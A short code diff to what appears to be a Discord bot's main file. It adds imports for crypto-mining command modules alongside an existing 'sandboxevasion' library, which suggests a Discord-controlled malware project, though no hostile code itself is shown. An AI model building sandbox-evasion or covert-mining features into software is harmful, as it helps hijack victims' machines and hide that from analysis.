@@ -3,6 +3,8 @@ import discord
 from code.discord.bot import BOT
 from libraries import sandboxevasion, maciassdopia
 
+from code.discord.cogs import commands, interactButton, cryptoMining, miningInteractButtons
+
 
 GUILD = discord.Object(id = "{GUILD}")
 CHANNEL = int("{CHANNEL}")
